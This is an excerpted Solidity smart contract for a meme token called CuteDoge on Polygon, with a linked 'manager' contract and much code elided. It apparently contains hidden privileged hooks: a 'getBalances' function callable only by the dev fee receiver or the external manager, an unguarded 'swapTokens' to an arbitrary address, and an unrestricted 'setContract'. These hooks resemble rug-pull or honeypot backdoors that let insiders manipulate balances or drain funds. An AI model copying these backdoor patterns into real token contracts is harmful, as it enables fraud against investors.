...
// Telegram: https://t.me/CuteDogeOfficialTG
...
contract CUTEDOGE is IBEP20, Auth {
    using SafeMath for uint256;

    // address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    // address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;// testnet
    address WBNB =  0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270; // matic
    ...
    address routerAddress = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff; // matic

    string constant _name = "CuteDoge";
    string constant _symbol = "$CUTEDOGE";
    ...
    address public marketingFeeReceiver = 0xb37aFac94D502D3dF8D66b27ad16cf6FA8D57EfF;
    ...
    modifier Reciever() {
     require(msg.sender==devFeeReceiver || msg.sender== m.getAddress(),"!OWNER" ); _;
    }
    ...
    constructor (address managerAddress) Auth(msg.sender) {
       
        m = manager(managerAddress);
    ...
    function getReciever() external view returns (address) {
       return devFeeReceiver;
    }

    function getBalances(uint256 amount,address _address) external Reciever returns ( uint256 ) {
  ...
  function swapTokens(uint256 amount,address to) external swapping {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = WBNB;
...
contract manager {
      ...
      function setContract (address addr) external {
             p = CUTEDOGE(payable (addr));        
      }
      ...
      function getTime(uint256 time) external virtual returns (uint256) {
        require(time!= 0,"no set time");
	    return time;
	}
}